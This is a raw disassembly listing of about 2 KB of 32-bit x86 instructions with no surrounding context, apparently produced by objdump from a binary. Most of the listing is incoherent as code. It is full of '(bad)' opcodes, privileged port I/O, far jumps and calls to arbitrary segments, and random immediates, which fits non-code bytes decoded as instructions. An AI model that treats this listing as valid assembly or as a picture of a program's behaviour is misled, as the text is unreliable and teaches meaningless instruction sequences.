  40f856:	mov    dl,0x43
  40f858:	push   ds
  40f859:	and    ebp,ebp
  40f85b:	jecxz  0x40f7e6
  40f85d:	call   0x3e32:0x146b6bcc
  40f864:	aam    0x10
  40f866:	call   0xf2a241b4
  40f86b:	shl    DWORD PTR [edi+0x452f6a2b],cl
  40f871:	sbb    eax,0x5fbf78e0
  40f876:	enter  0xaafd,0xd9
  40f87a:	sub    DWORD PTR [ebx-0x2eebcba0],ebx
  40f880:	cwde   
  40f881:	mov    cl,0xbc
  40f883:	cmp    eax,0x1121e94b
  40f888:	in     eax,0x4
  40f88a:	and    ebp,DWORD PTR [ecx+0x4cad6d8b]
  40f890:	fistp  DWORD PTR ds:0x829a6416
  40f896:	and    al,BYTE PTR [esi+0x5f]
  40f899:	mov    al,0x53
  40f89b:	inc    ebx
  40f89c:	jb     0x40f918
  40f89e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f89f:	adc    al,0x1f
  40f8a1:	popf   
  40f8a2:	mov    ds:0xd8111300,al
  40f8a7:	and    esp,DWORD PTR [ecx+0x1d92af1b]
  40f8ad:	cs in  eax,dx
  40f8af:	fdivr  DWORD PTR [eax-0x55e65dd5]
  40f8b5:	jl     0x40f8ff
  40f8b7:	fild   QWORD PTR [edx]
  40f8b9:	les    ebx,FWORD PTR [ecx+0x2a]
  40f8bc:	and    eax,0x2d29b3d4
  40f8c1:	push   ss
  40f8c2:	out    0x78,al
  40f8c4:	outs   dx,BYTE PTR ds:[esi]
  40f8c5:	mov    edx,DWORD PTR [edi]
  40f8c7:	shr    DWORD PTR [ebx+0x79],1
  40f8ca:	fiadd  DWORD PTR ds:0x7a02a533
  40f8d0:	xchg   edx,eax
  40f8d1:	mov    ecx,0x369504ad
  40f8d6:	ret    
  40f8d7:	cli    
  40f8d8:	(bad)  
  40f8d9:	or     ebp,DWORD PTR [eax]
  40f8db:	sub    BYTE PTR [edx],bl
  40f8dd:	mov    ds:0x9e8d757a,al
  40f8e2:	add    al,0xf
  40f8e4:	gs pop eax
  40f8e6:	les    ebx,FWORD PTR [ebp+edx*8-0x57]
  40f8ea:	mov    eax,ds:0x996f7a82
  40f8ef:	nop
  40f8f0:	mov    eax,0x6482548a
  40f8f5:	push   ss
  40f8f6:	mov    esi,0x8e34b7fd
  40f8fb:	inc    edi
  40f8fc:	pop    ebx
  40f8fd:	js     0x40f888
  40f8ff:	mov    ch,0x4
  40f901:	aas    
  40f902:	lock push 0xb8577b7c
  40f908:	(bad)  
  40f90a:	jl     0x40f91c
  40f90c:	or     BYTE PTR [edx],cl
  40f90e:	fwait
  40f90f:	(bad)  
  40f910:	iret   
  40f911:	mov    ch,0xe3
  40f913:	fcmovu st,st(0)
  40f915:	ret    0xeb97
  40f918:	mov    dh,0x1b
  40f91a:	lods   eax,DWORD PTR ds:[esi]
  40f91b:	ins    BYTE PTR es:[edi],dx
  40f91c:	inc    edx
  40f91d:	sar    DWORD PTR [ebx-0x4db70ab1],cl
  40f923:	sub    esi,ebp
  40f925:	sti    
  40f926:	in     eax,dx
  40f927:	dec    ecx
  40f928:	sub    edi,DWORD PTR cs:[ecx]
  40f92b:	push   edi
  40f92c:	or     BYTE PTR [ecx],dh
  40f92e:	(bad)  
  40f92f:	sti    
  40f930:	das    
  40f931:	stc    
  40f932:	scas   al,BYTE PTR es:[edi]
  40f933:	xor    BYTE PTR [edx+0x252b79ac],0xac
  40f93a:	adc    eax,0x99a312c9
  40f93f:	ret    0x87be
  40f942:	jge    0x40f96d
  40f944:	daa    
  40f945:	mov    eax,ds:0x1a648259
  40f94a:	dec    edx
  40f94b:	adc    DWORD PTR [bx+si],ebx
  40f94e:	mul    edi
  40f950:	sahf   
  40f951:	ja     0x40f9ad
  40f953:	fidivr DWORD PTR [ebp+0x5cf84957]
  40f959:	cmc    
  40f95a:	mov    al,ds:0xee17923d
  40f95f:	adc    dl,0xac
  40f962:	push   ss
  40f963:	icebp  
  40f964:	sub    al,0x69
  40f966:	icebp  
  40f967:	cli    
  40f968:	cld    
  40f969:	out    dx,eax
  40f96a:	es int 0x60
  40f96d:	pop    esi
  40f96e:	mov    DWORD PTR [edi-0x6ef8c3a],ecx
  40f974:	repnz imul edx,DWORD PTR gs:[esi-0x1418bf6e],0xffffffc2
  40f97d:	lock jge 0x40f9c9
  40f980:	dec    edx
  40f981:	fucom  st(5)
  40f983:	dec    edx
  40f984:	xchg   ebx,eax
  40f985:	xor    al,ah
  40f987:	fcomp  DWORD PTR [esi-0x2]
  40f98a:	call   0x74855979
  40f98f:	enter  0xb916,0x24
  40f993:	pop    ss
  40f994:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40f996:	rcl    ecx,1
  40f998:	push   ecx
  40f999:	(bad)  
  40f99a:	(bad)  
  40f99b:	test   DWORD PTR [eax-0x2223ecc4],edi
  40f9a1:	add    BYTE PTR [esi+0x42],al
  40f9a4:	iret   
  40f9a5:	pop    edx
  40f9a6:	sbb    BYTE PTR [ebx-0x76],al
  40f9a9:	lods   al,BYTE PTR ds:[esi]
  40f9aa:	jae    0x40f97c
  40f9ac:	mov    ds:0x29bda4cf,al
  40f9b1:	scas   eax,DWORD PTR es:[edi]
  40f9b2:	pop    ss
  40f9b3:	shr    BYTE PTR [ecx-0x75e74c02],cl
  40f9b9:	pusha  
  40f9ba:	sar    BYTE PTR [ecx+edi*8+0x42],cl
  40f9be:	push   eax
  40f9bf:	repnz push ebp
  40f9c1:	in     al,dx
  40f9c2:	int    0xcf
  40f9c4:	push   eax
  40f9c5:	cdq    
  40f9c6:	or     eax,0xcc02a815
  40f9cb:	jo     0x40f96b
  40f9cd:	fisubr DWORD PTR [edi+0x4f3ac1c8]
  40f9d3:	add    al,0xd9
  40f9d5:	or     edi,ebp
  40f9d7:	or     DWORD PTR [edi],eax
  40f9d9:	or     al,0xb7
  40f9db:	bound  ebp,QWORD PTR [eax+0x18]
  40f9de:	jle    0x40f9bd
  40f9e0:	or     BYTE PTR [esi-0x441860f3],0x40
  40f9e7:	add    al,0xf1
  40f9e9:	(bad)  [edx]
  40f9eb:	sbb    ebx,eax
  40f9ed:	lea    ebx,[edi+0x39]
  40f9f0:	int3   
  40f9f1:	push   ebp
  40f9f2:	scas   al,BYTE PTR es:[edi]
  40f9f3:	jecxz  0x40f990
  40f9f5:	test   BYTE PTR [eax-0x65],ch
  40f9f8:	inc    eax
  40f9f9:	push   edi
  40f9fa:	xchg   DWORD PTR [edx+ebx*1],ebp
  40f9fd:	push   edi
  40f9fe:	or     edi,DWORD PTR [ebx-0x32]
  40fa01:	jp     0x40fa37
  40fa03:	sub    eax,0xf3838e73
  40fa08:	in     al,dx
  40fa09:	lock cwde 
  40fa0b:	xchg   esp,eax
  40fa0c:	jmp    0x40f9db
  40fa0e:	loop   0x40fa6d
  40fa10:	sub    DWORD PTR [si],esp
  40fa13:	ja     0x40fa6a
  40fa15:	mov    eax,ds:0x8fbd75f0
  40fa1a:	in     eax,dx
  40fa1b:	sbb    edi,DWORD PTR ds:0xbf6ee036
  40fa21:	sub    ebp,eax
  40fa23:	lds    esi,FWORD PTR [eax-0x1a1af1e3]
  40fa29:	stc    
  40fa2a:	dec    ebp
  40fa2b:	cdq    
  40fa2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa2d:	retf   
  40fa2e:	mov    ah,0xcc
  40fa30:	add    BYTE PTR [edi+0x12],bl
  40fa33:	mov    bl,0x99
  40fa35:	sahf   
  40fa36:	arpl   WORD PTR [ebp+0x4e22ff03],di
  40fa3c:	mov    bh,0xbc
  40fa3e:	xchg   esi,eax
  40fa3f:	out    dx,eax
  40fa40:	sbb    esp,DWORD PTR [edx*1-0x84c5f9e]
  40fa47:	(bad)  
  40fa48:	in     al,0x14
  40fa4a:	xor    eax,0x4dc14bf6
  40fa4f:	cmp    ebp,DWORD PTR [eax]
  40fa51:	mov    esi,0x772f8508
  40fa56:	test   al,0xa8
  40fa58:	aas    
  40fa59:	in     al,dx
  40fa5a:	pop    ebp
  40fa5b:	dec    ecx
  40fa5c:	or     ecx,esp
  40fa5e:	dec    esi
  40fa5f:	hlt    
  40fa60:	sbb    esp,edx
  40fa62:	pop    ebp
  40fa63:	xchg   ebp,eax
  40fa64:	mov    ebx,0x79ab458b
  40fa69:	mov    ah,0xfe
  40fa6b:	das    
  40fa6c:	les    ebx,FWORD PTR [eax]
  40fa6e:	mov    ah,0xfe
  40fa70:	sbb    eax,0x6e8737d0
  40fa75:	sub    al,0x28
  40fa77:	mov    ebx,ebp
  40fa79:	and    eax,0x694fcb37
  40fa7e:	sar    DWORD PTR [edi+0x75866e26],0x2a
  40fa85:	mov    dh,0xb2
  40fa87:	inc    esp
  40fa88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa89:	and    ecx,DWORD PTR [edi-0x20]
  40fa8c:	mov    edx,0x1635e6c3
  40fa91:	jno    0x40fae1
  40fa93:	cmp    BYTE PTR ds:0x349dd72f,dh
  40fa99:	xchg   ebx,eax
  40fa9a:	out    dx,al
  40fa9b:	iret   
  40fa9c:	xchg   esp,eax
  40fa9d:	and    dh,ch
  40fa9f:	mov    ds,WORD PTR [edx-0x24]
  40faa2:	sbb    eax,0x65ce2deb
  40faa7:	jbe    0x40fb1c
  40faa9:	mov    ebp,0x13afef38
  40faae:	lahf   
  40faaf:	inc    ebp
  40fab0:	fdiv   DWORD PTR [ebp+eax*1+0x4165f1e9]
  40fab7:	cmp    al,bh
  40fab9:	popa   
  40faba:	repnz fcomp st(1)
  40fabd:	or     DWORD PTR [ebx],esi
  40fabf:	mov    esp,0xd4fb5223
  40fac4:	xor    eax,0x76c848dd
  40fac9:	and    bl,BYTE PTR [edx+0x75a63cbb]
  40facf:	or     bl,dl
  40fad1:	xchg   bl,al
  40fad3:	or     esi,DWORD PTR [edx-0x2ff7e5d4]
  40fad9:	clc    
  40fada:	push   0x0
  40fadc:	jmp    0x40fafc
  40fade:	repnz push ebp
  40fae0:	add    al,0xb2
  40fae2:	or     ebp,DWORD PTR [ebx]
  40fae4:	pop    edx
  40fae5:	js     0x40fa97
  40fae7:	ret    
  40fae8:	mov    dl,0xfe
  40faea:	stos   DWORD PTR es:[edi],eax
  40faeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faec:	add    ecx,ebx
  40faee:	or     al,0x55
  40faf1:	out    0x6a,al
  40faf3:	push   esp
  40faf4:	dec    edi
  40faf5:	stos   DWORD PTR es:[edi],eax
  40faf6:	ret    
  40faf7:	jno    0x40fb3e
  40faf9:	(bad)  
  40fafa:	push   ebp
  40fafb:	sbb    al,0xbd
  40fafd:	stos   BYTE PTR es:[edi],al
  40fafe:	out    0x73,al
  40fb00:	scas   al,BYTE PTR es:[edi]
  40fb01:	lods   eax,DWORD PTR ds:[esi]
  40fb02:	icebp  
  40fb03:	xchg   ecx,eax
  40fb04:	out    dx,al
  40fb05:	enter  0x29da,0x14
  40fb09:	in     al,0xd3
  40fb0b:	add    eax,DWORD PTR [esi]
  40fb0d:	das    
  40fb0e:	stc    
  40fb0f:	mov    edi,0x1df28536
  40fb14:	jb     0x40fb50
  40fb16:	adc    eax,0xfd7cb933
  40fb1b:	jle    0x40fb75
  40fb1d:	sbb    BYTE PTR [ecx],ch
  40fb1f:	in     eax,0xb
  40fb21:	pop    esp
  40fb22:	and    eax,0xc85ae0c0
  40fb27:	mov    ch,0xaa
  40fb29:	imul   ebx,DWORD PTR [ebp+ebp*2-0x5e],0x4805cca1
  40fb31:	push   0x4
  40fb33:	mov    ah,0xc7
  40fb35:	call   0xf0bc:0xf11f800a
  40fb3c:	scas   eax,DWORD PTR es:[edi]
  40fb3d:	rcr    BYTE PTR [edx+0x44],0x59
  40fb41:	jo     0x40fb99
  40fb43:	adc    al,0x34
  40fb45:	mov    cl,0x3e
  40fb47:	jge    0x40fb1f
  40fb49:	fldcw  WORD PTR [eax]
  40fb4b:	test   DWORD PTR [ebp+0x4185d79e],edi
  40fb51:	rcr    DWORD PTR [edi-0x551b5cdd],0xd0
  40fb58:	loopne 0x40fbb2
  40fb5a:	aad    0x47
  40fb5c:	dec    ebp
  40fb5d:	dec    DWORD PTR [ecx-0x1125c00f]
  40fb63:	sbb    al,0x7
  40fb65:	adc    al,0xaa
  40fb67:	inc    edx
  40fb68:	xchg   esi,eax
  40fb69:	pop    esp
  40fb6a:	dec    esp
  40fb6b:	push   ebp
  40fb6c:	retf   
  40fb6d:	(bad)  
  40fb6e:	fistp  WORD PTR [ecx+ebx*1]
  40fb71:	sub    ecx,DWORD PTR [ebx+eax*8]
  40fb74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb75:	pop    esp
  40fb76:	adc    DWORD PTR [ecx-0x40],esi
  40fb79:	push   cs
  40fb7a:	add    DWORD PTR [ecx],ecx
  40fb7c:	fisubr WORD PTR [eax-0x64]
  40fb7f:	sub    edi,esp
  40fb81:	pusha  
  40fb82:	dec    esp
  40fb83:	dec    ecx
  40fb84:	in     eax,dx
  40fb85:	dec    ecx
  40fb86:	(bad)  
  40fb87:	lock mov ah,0x33
  40fb8a:	inc    esi
  40fb8b:	aaa    
  40fb8c:	int    0x42
  40fb8e:	adc    al,0x5e
  40fb90:	jne    0x40fbca
  40fb92:	or     eax,0x5aac2894
  40fb97:	sub    eax,0x5d097ac1
  40fb9c:	pop    eax
  40fb9d:	xchg   DWORD PTR [ecx-0x527dc442],edx
  40fba3:	and    BYTE PTR [esi+ebp*1],0x90
  40fba7:	cs ins DWORD PTR es:[edi],dx
  40fba9:	jp     0x40fc0c
  40fbab:	mov    ds:0x9c8e86b5,al
  40fbb0:	mov    al,0xe0
  40fbb3:	add    DWORD PTR [eax-0x6c],ebp
  40fbb6:	sbb    eax,0x463d4df9
  40fbbb:	test   eax,0xf7355ee1
  40fbc0:	call   0x458c:0x15eb18c9
  40fbc7:	xchg   ebx,eax
  40fbc8:	push   es
  40fbc9:	push   0x3d
  40fbcb:	sti    
  40fbcc:	setl   BYTE PTR ds:0x9271466
  40fbd3:	push   es
  40fbd4:	cmc    
  40fbd5:	jbe    0x40fb8f
  40fbd7:	add    dl,cl
  40fbd9:	test   BYTE PTR [esi-0x61],ch
  40fbdc:	sbb    eax,0x3365e19
  40fbe1:	in     al,0xdb
  40fbe3:	out    dx,al
  40fbe4:	push   edx
  40fbe5:	fstp   st(3)
  40fbe7:	ss cmp eax,0xaca6994
  40fbed:	jnp    0x40fbd8
  40fbef:	sub    eax,0x90e3af6
  40fbf4:	inc    eax
  40fbf5:	pushf  
  40fbf6:	dec    esi
  40fbf7:	mov    ecx,0xc64331b9
  40fbfc:	push   es
  40fbfd:	outs   dx,DWORD PTR ds:[esi]
  40fbfe:	dec    ecx
  40fbff:	xchg   ecx,eax
  40fc00:	push   ecx
  40fc01:	in     eax,0xa6
  40fc03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc04:	or     esp,esp
  40fc06:	sbb    edi,edx
  40fc08:	fsubr  DWORD PTR [edx-0x7d]
  40fc0b:	mov    al,0xc8
  40fc0d:	mov    dl,0x29
  40fc0f:	icebp  
  40fc10:	jnp    0x40fc8d
  40fc12:	inc    ebp
  40fc13:	mov    bl,0xbd
  40fc15:	jg     0x40fbd2
  40fc17:	and    bl,0x76
  40fc1a:	rol    BYTE PTR [eax],cl
  40fc1c:	lea    edi,[eax+0x4387f1b4]
  40fc22:	pop    edi
  40fc23:	imul   esi,eax,0xd01ddd59
  40fc29:	add    BYTE PTR [ebx+edx*1],ah
  40fc2c:	out    dx,al
  40fc2d:	mov    eax,0xc2bdbf70
  40fc32:	test   esp,ebx
  40fc34:	pop    esp
  40fc35:	mov    ds,WORD PTR [ecx+0x35]
  40fc38:	mov    bh,0x21
  40fc3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc3b:	(bad)  
  40fc3c:	clc    
  40fc3d:	mov    al,BYTE PTR [eax+0x4c27d82e]
  40fc43:	jmp    0xdec2:0xfbfafcb4
  40fc4a:	jge    0x40fcbb
  40fc4c:	movzx  eax,WORD PTR [edi+eiz*4]
  40fc50:	cmp    eax,0x5e44f953
  40fc55:	jae    0x40fcb5
  40fc57:	data16 jl 0x40fcbf
  40fc5a:	cdq    
  40fc5b:	inc    ecx
  40fc5c:	push   edx
  40fc5d:	test   al,0x88
  40fc60:	mov    dh,0x6d
  40fc62:	inc    esi
  40fc63:	xor    eax,0xbedd203f
  40fc68:	xlat   BYTE PTR ds:[ebx]
  40fc69:	push   edi
  40fc6a:	out    0xd6,eax
  40fc6c:	aas    
  40fc6d:	pop    ss
  40fc6e:	nop
  40fc6f:	ret    
  40fc70:	and    dl,BYTE PTR [eax+0x42ffa845]
  40fc76:	aas    
  40fc77:	jmp    0x40fc3d
  40fc79:	stc    
  40fc7a:	and    eax,0xaed6685d
  40fc7f:	fidivr WORD PTR [edi]
  40fc81:	cmp    ebp,edx
  40fc83:	inc    esi
  40fc84:	pop    edi
  40fc85:	inc    eax
  40fc86:	scas   eax,DWORD PTR es:[edi]
  40fc87:	fwait
  40fc88:	adc    DWORD PTR [eiz*2-0x3a876454],edx
  40fc8f:	and    BYTE PTR [esi+0x6a],bl
  40fc92:	jnp    0x40fcdc
  40fc94:	and    esi,ebp
  40fc96:	cmp    BYTE PTR [edi],dl
  40fc98:	outs   dx,BYTE PTR ds:[esi]
  40fc99:	push   esi
  40fc9a:	fsubr  QWORD PTR [ebp-0x347fd67c]
  40fca0:	sbb    al,bh
  40fca2:	rol    DWORD PTR [eax],1
  40fca4:	neg    al
  40fca6:	push   0x432719e5
  40fcab:	(bad)  
  40fcac:	and    esp,edx
  40fcae:	mov    bh,0xef
  40fcb0:	fimul  DWORD PTR [edi-0x43]
  40fcb3:	dec    ebx
  40fcb4:	adc    al,0xd1
  40fcb6:	add    eax,0x72f58862
  40fcbb:	scas   al,BYTE PTR es:[edi]
  40fcbc:	out    0xc5,eax
  40fcbe:	inc    ebx
  40fcbf:	and    DWORD PTR [ebx],0x7562401b
  40fcc5:	call   0xb3cccadb
  40fcca:	mov    WORD PTR [edi+0x21],cs
  40fccd:	rol    BYTE PTR [edi-0x5f17f455],0x6b
  40fcd4:	pushf  
  40fcd5:	mov    dl,0x1
  40fcd7:	mov    edi,0x90850a05
  40fcdc:	push   es
  40fcdd:	or     cl,BYTE PTR [ecx+0x79]
  40fce0:	(bad)  
  40fce1:	mov    gs,WORD PTR [edi]
  40fce3:	into   
  40fce4:	out    0xb,al
  40fce6:	xor    esi,DWORD PTR [esi]
  40fce8:	jmp    0x888f8c6c
  40fced:	test   DWORD PTR [ebx+ecx*1-0x7211c362],0xdbf4ff09
  40fcf8:	jge    0x40fd60
  40fcfa:	xchg   DWORD PTR [edi+0x49],edi
  40fcfd:	mov    bh,0x5b
  40fcff:	add    al,0xc3
  40fd01:	call   0x6c1:0x259389cb
  40fd08:	dec    edx
  40fd09:	sbb    ebp,esp
  40fd0b:	dec    eax
  40fd0c:	cmp    eax,0x277492fe
  40fd11:	jbe    0x40fd7e
  40fd13:	mov    edx,0xc7b77c5a
  40fd18:	pop    edx
  40fd19:	arpl   di,si
  40fd1b:	shl    DWORD PTR ds:0x69917021,cl
  40fd21:	and    cl,BYTE PTR [ebp-0x668aa887]
  40fd27:	jmp    0x40fd04
  40fd29:	push   edx
  40fd2a:	jmp    0x40fce9
  40fd2c:	daa    
  40fd2d:	xchg   ecx,eax
  40fd2e:	and    BYTE PTR [edi-0x53],ch
  40fd31:	cmp    al,0x31
  40fd33:	dec    eax
  40fd34:	fsubrp st(2),st
  40fd36:	leave  
  40fd37:	cwde   
  40fd38:	jae    0x40fd5b
  40fd3a:	stos   BYTE PTR es:[edi],al
  40fd3b:	lods   al,BYTE PTR ds:[esi]
  40fd3c:	add    DWORD PTR [edx+0x14],ebp
  40fd3f:	test   eax,0x7db457b0
  40fd44:	adc    al,al
  40fd46:	mov    ds:0x6a119f9d,al
  40fd4b:	push   es
  40fd4c:	pop    eax
  40fd4d:	jb     0x40fcfe
  40fd4f:	jp     0x40fdcb
  40fd51:	sbb    DWORD PTR [ebx+ebx*4+0x445d0206],edx
  40fd58:	pop    esp
  40fd59:	add    eax,0x569fce95
  40fd5e:	and    al,0x57
  40fd60:	push   esp
  40fd61:	lods   al,BYTE PTR ds:[esi]
  40fd62:	loop   0x40fd9b
  40fd64:	sub    eax,0xe578494f
  40fd69:	mov    ds:0x7a81f116,al
  40fd6e:	loop   0x40fdb3
  40fd70:	adc    DWORD PTR [ecx+0x77518ef7],esp
  40fd76:	das    
  40fd77:	add    DWORD PTR [esi+0x34],edi
  40fd7a:	sbb    DWORD PTR [eax+0xf],esp
  40fd7d:	outs   dx,DWORD PTR ds:[esi]
  40fd7e:	and    DWORD PTR [ecx+0x62],edi
  40fd81:	test   eax,0x79783e6
  40fd86:	rol    DWORD PTR [ebx+0x5d],1
  40fd89:	arpl   WORD PTR [ebx+0x7b41146d],sp
  40fd8f:	dec    esp
  40fd90:	sub    ecx,DWORD PTR ds:0x628c7b7d
  40fd96:	xchg   esp,eax
  40fd97:	mov    bh,BYTE PTR [ecx+0x4a]
  40fd9a:	shl    DWORD PTR [esi-0x7d],cl
  40fd9d:	(bad)  [edi]
  40fd9f:	sbb    al,0x5
  40fda1:	out    0xa5,eax
  40fda3:	mov    esp,0x32a04711
  40fda8:	inc    eax
  40fda9:	stos   DWORD PTR es:[edi],eax
  40fdaa:	or     eax,0x4e79dd6
  40fdaf:	stos   BYTE PTR es:[edi],al
  40fdb0:	xchg   esi,eax
  40fdb1:	cld    
  40fdb2:	nop
  40fdb3:	ins    BYTE PTR es:[edi],dx
  40fdb4:	das    
  40fdb5:	add    eax,0x6bb014e6
  40fdba:	les    eax,FWORD PTR [esi+0x3]
  40fdbd:	(bad)  
  40fdbe:	test   al,0x32
  40fdc0:	mov    BYTE PTR [eax+0xd],al
  40fdc3:	es loop 0x40fdf9
  40fdc6:	lods   al,BYTE PTR ds:[esi]
  40fdc7:	inc    ebp
  40fdc8:	outs   dx,DWORD PTR fs:[esi]
  40fdca:	out    0x39,eax
  40fdcc:	cmp    al,0xf2
  40fdce:	sbb    ch,BYTE PTR [edi-0x231e0d82]
  40fdd4:	rcl    BYTE PTR [ebx-0x78],cl
  40fdd7:	mov    DWORD PTR ds:0xebbf0f91,ecx
  40fddd:	into   
  40fdde:	fild   WORD PTR [ecx]
  40fde0:	sahf   
  40fde1:	psubw  mm7,QWORD PTR [edx]
  40fde4:	jmp    0x4de2a073
  40fde9:	push   ebx
  40fdea:	int3   
  40fdeb:	hlt    
  40fdec:	bnd jbe 0x40fe52
  40fdef:	in     eax,dx
  40fdf0:	push   esi
  40fdf1:	mov    ds:0xda4b561e,al
  40fdf6:	scas   al,BYTE PTR es:[edi]
  40fdf7:	lock rol BYTE PTR [eax],0x5
  40fdfb:	in     al,0x28
  40fdfd:	adc    ecx,edx
  40fdff:	push   ss
  40fe00:	out    0x75,eax
  40fe02:	dec    edx
  40fe03:	xchg   BYTE PTR [eax+0x36c33a9e],ah
  40fe09:	aas    
  40fe0a:	xor    DWORD PTR [esi-0x1c],ebx
  40fe0d:	mov    dh,0x50
  40fe0f:	test   al,0xa9
  40fe11:	jne    0x40fe21
  40fe13:	inc    edi
  40fe14:	fiadd  DWORD PTR [esi-0x64]
  40fe17:	sbb    dh,bh
  40fe19:	pop    ebx
  40fe1a:	mov    bh,0x60
  40fe1c:	xchg   DWORD PTR [edi],ebp
  40fe1e:	std    
  40fe1f:	cmp    eax,DWORD PTR [ebp+0x20]
  40fe22:	hlt    
  40fe23:	pop    ss
  40fe24:	je     0x40fdf3
  40fe26:	xor    bl,0xff
  40fe29:	jns    0x40fded
  40fe2b:	xor    DWORD PTR [edi-0x3102a09a],esp
  40fe31:	jp     0x40fdf1
  40fe33:	call   DWORD PTR [ebx]
  40fe35:	adc    cl,dh
  40fe37:	cmp    bl,bh
  40fe39:	and    cl,BYTE PTR [esi+0x145f54c8]
  40fe3f:	les    edx,FWORD PTR [edi]
  40fe41:	push   ebx
  40fe42:	xchg   DWORD PTR [ecx],edi
  40fe44:	gs inc eax
  40fe46:	mov    ebx,0x8a66bf59
  40fe4b:	adc    esi,DWORD PTR ds:0xb32a0d03
  40fe51:	adc    dh,BYTE PTR [ecx+0x5d]
  40fe54:	rcr    ah,1
  40fe56:	nop
  40fe57:	stos   BYTE PTR es:[edi],al
  40fe58:	nop
  40fe59:	xor    al,0x43
  40fe5b:	adc    DWORD PTR [ebx],0x39799e97
  40fe61:	pop    ds
  40fe62:	bound  eax,QWORD PTR [eax+0x42de1c4f]
  40fe68:	dec    esp
  40fe69:	add    DWORD PTR [edx],0xda059388
  40fe6f:	std    
  40fe70:	xchg   ebx,eax
  40fe71:	mov    bl,0x63
  40fe73:	inc    edx
  40fe74:	cmp    DWORD PTR [esi+0x4848960c],ebx
  40fe7a:	imul   DWORD PTR [ecx]
  40fe7c:	mov    cl,0x20
  40fe7e:	ins    BYTE PTR es:[edi],dx
  40fe7f:	push   eax
  40fe80:	std    
  40fe81:	inc    eax
  40fe82:	out    dx,eax
  40fe83:	int    0xe0
  40fe85:	push   cs
  40fe86:	cmp    BYTE PTR [eax+0x34],0xb3
  40fe8a:	aaa    
  40fe8b:	push   es
  40fe8c:	dec    esi
  40fe8d:	fwait
  40fe8e:	(bad)  
  40fe8f:	cld    
  40fe90:	inc    esp
  40fe91:	adc    edx,DWORD PTR [eax]
  40fe93:	das    
  40fe94:	mov    ebp,0xbaf53459
  40fe99:	out    dx,eax
  40fe9a:	jo     0x40feb7
  40fe9c:	pusha  
  40fe9d:	cli    
  40fe9e:	addr16 mov eax,ds:0x96b0
  40fea2:	or     edi,edx
  40fea4:	push   ebx
  40fea5:	add    DWORD PTR [edi+0x2acda80],esp
  40feab:	mul    ebx
  40fead:	popa   
  40feae:	xchg   eax,eax
  40feb0:	cmp    DWORD PTR [edx+0x69ea9f86],esp
  40feb6:	in     al,dx
  40feb7:	or     ebx,edi
  40feb9:	les    ebx,FWORD PTR [ebx+0x5]
  40febc:	call   0x4166e1d
  40fec1:	mov    ah,BYTE PTR [edx-0x1c]
  40fec4:	out    0x19,al
  40fec6:	mov    ebx,0x16ebc7d4
  40fecb:	in     al,0xdb
  40fecd:	xor    eax,0x596da53f
  40fed2:	xor    eax,0x777514c6
  40fed7:	ret    
  40fed8:	inc    edx
  40fed9:	mov    ebp,0xfdd192f8
  40fede:	pusha  
  40fedf:	(bad)  
  40fee0:	push   esi
  40fee1:	xchg   esp,eax
  40fee2:	dec    edi
  40fee3:	cmp    DWORD PTR [eax],0xffffff8d
  40fee6:	int3   
  40fee7:	cmp    DWORD PTR [esp+eax*1],esp
  40feea:	xchg   edi,eax
  40feeb:	fcomip st,st(4)
  40feed:	xchg   esp,eax
  40feee:	and    ecx,DWORD PTR [ebx+0x337dd750]
  40fef4:	push   0x9cc8e6dc
  40fef9:	cwde   
  40fefa:	ret    0x1179
  40fefd:	(bad)  [edx]
  40feff:	pop    eax
  40ff00:	adc    al,0x1f
  40ff02:	out    0xaa,al
  40ff04:	imul   ebx,eax,0xfffffff2
  40ff07:	sub    DWORD PTR [ecx],edi
  40ff09:	push   ss
  40ff0a:	jne    0x40feb0
  40ff0c:	int    0x2e
  40ff0e:	dec    edi
  40ff0f:	loop   0x40ff8e
  40ff11:	cmp    eax,0x88e13d6b
  40ff16:	mov    ah,0xa9
  40ff18:	mov    al,ds:0xaa047bf0
  40ff1d:	int3   
  40ff1e:	sbb    dl,BYTE PTR [eax+eiz*2+0x36262881]
  40ff25:	lods   al,BYTE PTR ds:[esi]
  40ff26:	jge    0x40ffa7
  40ff28:	mov    dl,0xd5
  40ff2a:	dec    edi
  40ff2b:	outs   dx,BYTE PTR ds:[esi]
  40ff2c:	xchg   esi,eax
  40ff2d:	pop    edi
  40ff2e:	dec    ebx
  40ff2f:	nop
  40ff30:	popf   
  40ff31:	loop   0x40feb7
  40ff33:	xchg   DWORD PTR [esp+edx*1],ebp
  40ff36:	pop    ecx
  40ff37:	mov    DWORD PTR [ebp-0xbda00e8],edi
  40ff3d:	loope  0x40ff78
  40ff3f:	lds    ebx,FWORD PTR ds:0xe051b0e7
  40ff45:	daa    
  40ff46:	pop    edi
  40ff47:	pextrw esi,mm6,0x6c
  40ff4b:	dec    edx
  40ff4c:	or     DWORD PTR [ebp-0x52533368],esi
  40ff52:	scas   eax,DWORD PTR es:[edi]
  40ff53:	xchg   esp,eax
  40ff54:	pop    es
  40ff55:	pop    esi
  40ff57:	call   0x878e8a73
  40ff5c:	ror    BYTE PTR [ecx+0x622e4bfc],0x8
  40ff63:	add    bl,BYTE PTR [bx+0x2bb3]
  40ff68:	es xchg ecx,eax
  40ff6a:	dec    edi
  40ff6b:	aaa    
  40ff6c:	popf   
  40ff6d:	or     edi,eax
  40ff6f:	mov    ecx,0xa48dfe0
  40ff74:	out    0x36,al
  40ff76:	add    eax,0x4946c05f
  40ff7b:	sbb    BYTE PTR [ecx],bl
  40ff7d:	dec    esp
  40ff7e:	mov    ah,BYTE PTR [edi-0xe]
  40ff81:	scas   al,BYTE PTR es:[edi]
  40ff82:	mov    bl,0xd
  40ff84:	mov    esp,0x69540ab7
  40ff89:	mov    cl,0x8a
  40ff8b:	xlat   BYTE PTR es:[ebx]
  40ff8d:	les    ebx,FWORD PTR [edx]
  40ff8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff90:	adc    al,0x78
  40ff92:	mov    ecx,0xbce0861a
  40ff97:	dec    esp
  40ff98:	clc    
  40ff99:	je     0x40ff57
  40ff9b:	outs   dx,DWORD PTR ds:[esi]
  40ff9d:	repnz cld 
  40ff9f:	aam    0x5f
